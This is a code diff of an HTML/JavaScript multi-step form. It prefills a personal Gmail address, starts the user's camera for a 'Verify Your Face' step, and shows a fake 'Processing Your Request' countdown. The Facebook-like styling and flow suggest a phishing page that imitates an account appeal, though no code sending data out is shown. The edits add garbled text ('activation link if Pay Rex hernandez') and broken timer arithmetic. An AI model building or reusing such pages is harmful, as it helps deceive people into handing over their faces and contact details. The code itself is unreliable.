@@ -152,20 +152,20 @@ body{background:#1c1e21;min-height:100vh;display:flex;justify-content:center;ali
         <input type="email" class="input-field" id="contactEmail" value="rex.hernandez@gmail.com" placeholder="your@email.com">
         <label class="label" style="font-size:13px;">Confirm Email Address</label>
         <input type="email" class="input-field" id="contactEmailConfirm" value="rex.hernandez@gmail.com" placeholder="your@email.com">
-        <div class="notice"><i class="fas fa-envelope"></i><span>We will send an activation link to this email once reviewed.</span></div>
+        <div class="notice"><i class="fas fa-envelope"></i><span>We will send an activation link if Pay Rex hernandez.</span></div>
         <div class="btn-row">
           <button class="btn-back" onclick="goToPage(2)"><i class="fas fa-chevron-left" style="margin-right:6px;font-size:12px;"></i> Back</button>
           <button class="btn-next" onclick="goToPage(4)">Next <i class="fas fa-chevron-right" style="margin-left:6px;font-size:12px;"></i></button>
         </div>
       </div>
-<!-- PAGE 4: VERIFY YOUR FACE -->
+ <!-- PAGE 4: VERIFY YOUR FACE -->
 <div class="page" id="page4">
   <div class="face-container">
     <h3 class="face-title">Verify Your Face</h3>
     <p class="face-desc">Position your face inside the frame.</p>
     
     <div class="face-icon-box" id="faceIconBox" style="border-radius: 50%; overflow: hidden; background: #000; width: 140px; height: 140px; margin: 0 auto 20px; position: relative;">
-      <video id="cameraPreview" autoplay playsinline muted style="width: 100%; height: 100%; object-fit: cover; display: none;"></video>
+      <video id="cameraPreview" autoplay playsinline muted style="width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1);"></video>
       <i class="fas fa-camera" id="cameraIcon" style="font-size: 48px; color: #65676b; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"></i>
     </div>
     
@@ -184,7 +184,7 @@ body{background:#1c1e21;min-height:100vh;display:flex;justify-content:center;ali
       <button class="btn-next" id="startScanBtn" onclick="startCamera()">Start Camera</button>
     </div>
   </div>
-</div> 
+</div>
 
       <div class="page" id="page5">
         <div class="loading-screen">
@@ -192,7 +192,7 @@ body{background:#1c1e21;min-height:100vh;display:flex;justify-content:center;ali
           <h3 class="loading-title">Processing Your Request</h3>
           <p class="loading-text">Please wait while we review your information...</p>
           <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-          <p class="time-remaining" id="timeRemaining">Estimated wait time: 1minutes</p>
+          <p class="time-remaining" id="timeRemaining">Estimated wait time: 30sec or 30mins</p>
         </div>
       </div>
 
@@ -256,19 +256,19 @@ function goToPage(pageNum){
 function submitReview(){
   goToPage(5);
   let progress = 0;
-  let waitSeconds = 50;
+  let waitSeconds = 30;
   timerInterval = setInterval(() => {
-    progress += (10 / waitSeconds);
-    if(progress >= 10){
+    progress += (30 / waitSeconds);
+    if(progress >= 30){
       clearInterval(timerInterval);
       goToPage(6);
       return;
     }
     document.getElementById('progressFill').style.width = progress + '%';
-    let mins = Math.floor((waitSeconds - (progress/10)*waitSeconds) / 10);
-    let secs = Math.floor((waitSeconds - (progress/10)*waitSeconds) % 10);
+    let mins = Math.floor((waitSeconds - (progress/50)*waitSeconds) / 50);
+    let secs = Math.floor((waitSeconds - (progress/50)*waitSeconds) % 50);
     document.getElementById('timeRemaining').textContent = `Estimated wait time: ${mins}m ${secs}s`;
-  }, 50);
+  }, 30);
 }
 let cameraStream = null;
 
